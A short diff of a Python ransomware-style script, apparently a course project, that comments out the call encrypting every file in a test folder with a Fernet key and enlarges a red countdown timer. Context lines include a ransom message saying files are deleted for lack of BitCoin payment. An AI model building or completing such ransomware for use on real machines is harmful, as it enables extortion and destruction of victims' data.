@@ -99,7 +99,7 @@ file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test'
 #Creates the Fernet object and the fernet encryption key
 crypter, key = create_key()
 #Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
-encrypt_files(file_paths, crypter)
+#encrypt_files(file_paths, crypter)
 
 #Variable math to determine the starting time for the countdown timer
 curr_time = str(datetime.now())
@@ -119,8 +119,8 @@ def update_time():
         messagebox.showinfo(title = 'Files Deleted', message = 'The timer has reached zero, and we have not received any BitCoin from you. Your files have now been permanently deleted. Have a nice day.')
 
 #Widget for creating the timer display
-timer = Label(root, font=('Times New Roman', 64,'bold'), bg = 'red', fg = 'white')
-timer.place(x = 500, y = 310)
+timer = Label(root, font=('Times New Roman', 70,'bold'), bg = 'red', fg = 'white')
+timer.place(x = 495, y = 300)
 
 #Function to initialize the timer
 update_time()
